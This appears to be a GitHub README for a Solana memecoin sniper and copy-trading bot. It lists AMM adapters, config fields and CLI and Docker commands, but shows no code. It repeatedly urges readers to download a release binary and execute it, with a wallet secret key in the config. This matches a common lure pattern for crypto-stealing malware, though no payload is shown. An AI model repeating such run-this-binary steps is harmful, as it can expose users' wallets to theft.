[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&logoColor=white)](https://github.com/arshadkoori/Universal_Memecoin_Trading_Token_Launchpad_Bot/releases)

# Universal Memecoin Launchpad Trading Bot - Multi-Chain Sniper

💱 Memecoin Launchpad  
Topics: bonkfun, bundler, copy-trading, meteora-damm-v2, meteora-dlmm, meteora-dynamic-amm, mongodb, ocra, pump-amm, raydium-clmm, raydium-cpmm, raydium-v4, rust, sniper, solana, solfi, trading-bot, vertigo, volume, wallet-tracker

Preview image  
![Solana + Rust + MongoDB](https://cryptologos.cc/logos/solana-sol-logo.png?v=024)

A universal bot that discovers, snipes, and launches memecoin trades across Solana and other AMM designs. It pairs fast wallet tracking with modular strategy modules. Use it to automate launchpad flows, test liquidity strategies, or run controlled snipes. The releases page hosts compiled binaries, Docker images, and ready-to-run packages. Download the release asset and execute the file to install or run the bot: https://github.com/arshadkoori/Universal_Memecoin_Trading_Token_Launchpad_Bot/releases

Quick links
- Releases (download and execute the asset): https://github.com/arshadkoori/Universal_Memecoin_Trading_Token_Launchpad_Bot/releases
- Issues: open on GitHub issues
- Docs: docs/ (in-repo)

Badges
[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/arshadkoori/Universal_Memecoin_Trading_Token_Launchpad_Bot/actions)
[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)

What this bot does
- Tracks wallets and memecoin launch events on Solana and compatible chains.  
- Monitors AMM pools (Raydium CLMM/CPMM, Meteora DLMM/DAMM).  
- Executes preconfigured buy/sell flows at launch.  
- Bundles trade orders for fast execution (bundler).  
- Supports copy-trading from master wallets.  
- Provides a simple API and CLI for automation.  
- Stores events and trades in MongoDB for analytics.

Key features
- Multi-amm support: Raydium (v4, CLMM, CPMM), Meteora families, Vertigo pump-amm.  
- Wallet tracker: real-time memecoin and whale alerts.  
- Sniper engine: low-latency swap execution in Rust core.  
- Bundled orders: group trades and submit as one atomic operation.  
- Strategy modules: launchpad snipes, liquidity pump, safe buyback.  
- Risk controls: per-trade caps, slippage guard, cooldown.  
- Historic logging: MongoDB stores events, fills, and metrics.  
- Copy-trading: follow trusted wallets and mirror trades.  
- CLI + REST API for orchestration.

Architecture overview
- Core engine (Rust) — handles on-chain calls, mempool watching, and swaps. Rust ensures low latency and safe memory.  
- Strategy layer (TypeScript/Python) — defines trade logic and signals. Swap strategies live here.  
- Orchestration (Docker/PM2) — runs modules as services.  
- Storage (MongoDB) — stores events, trade history, and metrics.  
- Integrations — Solana RPCs, WebSocket trackers, Raydium contracts, Meteora AMM routers.  
- UI (optional) — simple dashboards and logs. The repo includes scripts to spin up a minimal dashboard.

Files and folders (high level)
- /core-rust — Rust engine, RPC client, signer, and swap modules.  
- /strategies — modular strategies and examples.  
- /cli — command line tools.  
- /docker — Docker manifests and compose files.  
- /scripts — utilities for key management, airdrops, tests.  
- /docs — extended docs, protocol mappings, and examples.  
- README.md — this file.

Quickstart (run binary from Releases)
1. Visit Releases and download the release asset. Download and execute the file.  
   - The release page contains a compiled binary, a Docker image, and a ZIP with configs. Download the matching asset for your OS and architecture.  
   - After download, set execute permission and run the binary or start the Docker image.

2. Minimal CLI launch (example)
- chmod +x umtlb-bot-linux
- ./umtlb-bot-linux --config configs/example.toml

3. Docker
- docker pull ghcr.io/arshadkoori/umtlb:latest
- docker run -it --env-file .env ghcr.io/arshadkoori/umtlb:latest

Configuration (core fields)
- rpc_url: Solana RPC endpoint. Use a low-latency provider.  
- wallet_key: Path to secret key or env variable with keypair.  
- mongodb_uri: Connection string for MongoDB.  
- strategies: Array of strategy configs. Each strategy contains:
  - type: sniper | launchpad | copy | pump
  - max_usd: cap per trade
  - slippage_pct: max allowed slippage
  - cooldown_ms: minimum wait between trades
- amms: Active AMM modules with router addresses and pools.

Example strategy (sniper)
- Trigger: token mint appears with liquidity add > min_liq  
- Action: estimate price, submit bundled buy with slippage guard, place sell target orders.  
- Safety: stop-loss, time-based cancel.

Supported protocols and modules
- Solana core RPC and WebSocket.  
- Raydium CLMM/CPMM and v4 swap router.  
- Meteora DLMM and DAMM modules.  
- Bonkfun and pump-amm adapters.  
- Vertigo volume tracking.  
- Ocra signer compatibility.  
- Wallet-tracker with WebSocket feed.

Storage and metrics
- MongoDB stores:
  - events: liquidity adds, mints, burns, swaps
  - trades: order details, fills, gas
  - wallets: tracked wallet history
  - metrics: latency, success rates
- Use the included mongo schema in /docs/mongo-schema.md for ETL and BI.

Security and key handling
- Keep keys off VCS. Use env files, vaults, or KMS.  
- Rotate keys often. Use read-only RPC keys for monitoring.  
- Run signing on isolated host or HSM. The Rust core supports remote signing via a secure HTTP signer protocol.  
- Limit trade caps in configs. Use whitelist and blacklist for tokens and pools.

Testing and simulation
- Unit tests live in core-rust/test.  
- Simulation mode replays events from MongoDB to evaluate strategy outcomes.  
- Use local validator or devnet for dry runs. The repo includes scripts to spin up tests.

Logging and observability
- Console logs in JSON for structured output.  
- Prometheus metrics endpoint for latency and throughput.  
- Basic Grafana dashboard templates in /docker/grafana.

Common commands
- Start bot: ./umtlb-bot --config configs/prod.toml  
- Run strategy test: ./umtlb-bot --simulate --trace-file test/trace.json  
- Export trades: ./tools/export_trades --from 2025-01-01 --to 2025-04-01

Contribution guide
- Fork the repo.  
- Create a branch per feature or fix.  
- Run tests locally.  
- Submit a PR with a clear description and a test case.  
- Tag maintainers for review.

Roadmap
- Add more AMM adapters: Ocra extended features.  
- Add more built-in strategies with backtest data.  
- Add a fully fledged web UI.  
- Add on-chain governance features for strategy sharing.

Troubleshooting
- If a strategy fails, check logs for RPC errors and latency spikes.  
- If trades fail, inspect slippage and pool liquidity.  
- If MongoDB disconnects, verify network, user, and auth.  
- If you cannot find releases, check the Releases section on GitHub.

Releases and updates
- Releases page contains compiled binaries and Docker images. Download the release asset and execute the file for a quick start: https://github.com/arshadkoori/Universal_Memecoin_Trading_Token_Launchpad_Bot/releases  
- Each release includes SHA256 sums. Verify downloads before execution.

Example use cases
- Launchpad sniper: detect new mints, snipe initial liquidity, place sell targets.  
- Copy trading: mirror a whale wallet with per-trade caps.  
- Liquidity testing: create test pools and measure AMM behavior.  
- Analytics: collect volume and trade metrics for research.

Licensing
- MIT License. See LICENSE file.

Credits and resources
- Solana RPC and WebSocket docs.  
- Raydium and Meteora protocol docs.  
- Rust for low-latency core.  
- MongoDB for event storage.

Contact and support
- Open an issue on GitHub for bugs or feature requests.  
- For operational support, include logs and a minimal repro.